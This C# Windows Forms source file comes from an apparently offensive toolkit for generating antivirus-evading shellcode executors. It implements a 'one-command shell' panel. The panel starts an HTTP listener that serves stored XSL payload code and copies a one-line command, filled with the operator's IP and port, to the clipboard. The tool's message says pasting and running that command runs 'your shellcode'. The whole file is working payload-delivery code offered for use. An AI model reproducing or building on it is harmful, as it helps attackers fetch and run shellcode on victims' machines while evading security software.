using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace 掩日___免杀执行器生成工具
{
    public partial class OneCmdShell : Form
    {
        public Boolean stop = false;
        public OneCmdShell()
        {
            InitializeComponent();
            textBox1.Text = Global_Var.Current_IP;
            textBox2.Text = Global_Var.HTTP_Port;
            if (Global_Var.Http_server_status)
            {
                label4.Text = "服务已开启在 " + Global_Var.HTTP_Port + " 端口";
                label4.ForeColor = Color.Green;
            }
            else 
            {
                label4.Text = "未开启";
                label4.ForeColor = Color.Red;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string finall_cmd = Global_Var.one_command.Replace("{put_ip_and_port_here}", textBox1.Text + ":" + textBox2.Text);
            Clipboard.SetDataObject(finall_cmd);
            MessageBox.Show("复制成功！粘贴执行即可运行你的shellcode。", "success");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Http_server_task();
        }

        public void Http_server_task()
        {
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add("http://" + textBox1.Text + ":" + textBox2.Text + "/");
            listener.Start();
            Global_Var.Http_server_status = true;
            label4.Text = "服务已开启在 " + textBox2.Text + " 端口";
            label4.ForeColor = Color.Green;
            Global_Var.HTTP_Port = textBox2.Text;
            Task task = Task.Factory.StartNew(() => {
                while (listener.IsListening && !stop)
                {
                    HttpListenerContext context = listener.GetContext();
                    HttpListenerRequest request = context.Request;
                    HttpListenerResponse response = context.Response;
                    using (StreamWriter writer = new StreamWriter(response.OutputStream))
                    {
                        writer.WriteLine(Global_Var.XSL_code);
                    }
                }
            });
            Task.WaitAll();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            stop = true;
            label4.Text = "未开启";
            label4.ForeColor = Color.Red;
            Global_Var.Http_server_status = false;
        }
    }
}
